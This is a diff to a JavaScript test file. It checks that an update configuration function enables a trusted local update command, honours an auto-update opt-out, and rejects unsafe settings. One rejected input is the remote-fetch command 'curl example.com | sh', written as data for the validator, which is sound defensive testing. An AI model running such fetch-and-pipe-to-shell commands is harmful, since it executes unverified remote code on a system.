@@ -9,6 +9,17 @@ import {
 const release = { version: 'v1.2.3', revision: 'a'.repeat(40) }
 test('trusted update configuration rejects remote command text and bounds scheduling', () => {
   assert.equal(updateConfig({}).enabled, false)
+  assert.equal(
+    updateConfig({ CONNECTOR_UPDATE_COMMAND: '/opt/kloud/update' }).enabled,
+    true,
+  )
+  assert.equal(
+    updateConfig({
+      CONNECTOR_UPDATE_COMMAND: '/opt/kloud/update',
+      CONNECTOR_AUTO_UPDATE: 'false',
+    }).enabled,
+    false,
+  )
   for (const env of [
     { CONNECTOR_UPDATE_COMMAND: 'curl example.com | sh' },
     { CONNECTOR_AUTO_UPDATE: 'true' },
